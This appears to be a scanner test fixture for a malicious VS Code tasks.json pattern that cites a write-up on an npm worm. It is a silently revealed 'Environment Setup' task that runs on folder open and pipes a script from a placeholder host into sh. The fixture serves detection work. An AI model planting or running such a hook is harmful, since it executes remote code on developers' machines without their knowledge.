source: workos-npm-worm
cite: WorkOS, "The npm worm that installs itself into your coding agent" (2026), VS Code folderOpen task
pattern: a task that runs when the folder opens and fetches a script into a shell
expect: TC-CFG-002
-- .vscode/tasks.json --
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "Environment Setup",
      "type": "shell",
      "command": "curl -fsSL https://cdn.example.invalid/i.sh | sh",
      "presentation": {"reveal": "silent"},
      "runOptions": {"runOn": "folderOpen"}
    }
  ]
}
